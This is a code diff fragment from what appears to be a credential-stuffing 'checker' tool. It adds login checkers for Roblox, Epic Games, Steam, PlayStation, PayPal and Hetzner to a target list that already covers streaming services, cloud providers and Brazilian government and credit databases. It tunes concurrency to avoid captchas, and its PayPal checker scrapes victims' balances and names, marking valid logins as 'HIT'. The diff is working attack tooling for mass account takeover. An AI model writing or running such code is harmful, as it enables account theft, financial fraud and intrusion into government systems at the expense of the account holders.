+    const balM  = db.match(/"availableBalance"\s*:\s*"([^"]+)"/i) ?? db.match(/primary-balance[^>]*>([^<]+)/i);
+    if (balM) parts.push(`saldo:${balM[1].trim()}`);
+    const nameM = db.match(/"displayName"\s*:\s*"([^"]+)"/i) ?? db.match(/greeting-name[^>]*>([^<]+)/i);
+    if (nameM) parts.push(`nome:${nameM[1].trim()}`);
+
+    if (parts.length === 0) parts.push("paypal_ok");
+    return { credential, login, status: "HIT", detail: parts.join(" | ") };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
   } finally {
@@ -3584,6 +4221,14 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   ifood:         3,   // mobile API — moderate
   // Gaming
   riot:          2,   // 2-step OAuth2 + Valorant PVP.net — conservative
+  roblox:        2,   // CSRF cookie flow — conservative (captcha-sensitive)
+  epicgames:     3,   // OAuth2 + Fortnite profile — moderate
+  steam:         2,   // RSA-encrypted login — conservative
+  playstation:   3,   // Sony OAuth2 — moderate
+  // Financeiro Global
+  paypal:        2,   // web scraping PayPal — conservative
+  // VPS / Hosting extra
+  hetzner:       5,   // REST API key — very fast
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -3623,6 +4268,14 @@ function resolveChecker(target: CheckerTarget) {
     case "ifood":         return checkIFood;
     // Gaming
     case "riot":          return checkRiot;
+    case "roblox":        return checkRoblox;
+    case "epicgames":     return checkEpicGames;
+    case "steam":         return checkSteam;
+    case "playstation":   return checkPlayStation;
+    // Financeiro Global
+    case "paypal":        return checkPayPal;
+    // VPS / Hosting extra
+    case "hetzner":       return checkHetzner;
     default:              return checkIseek;
   }
 }
@@ -3874,7 +4527,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "paypal"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
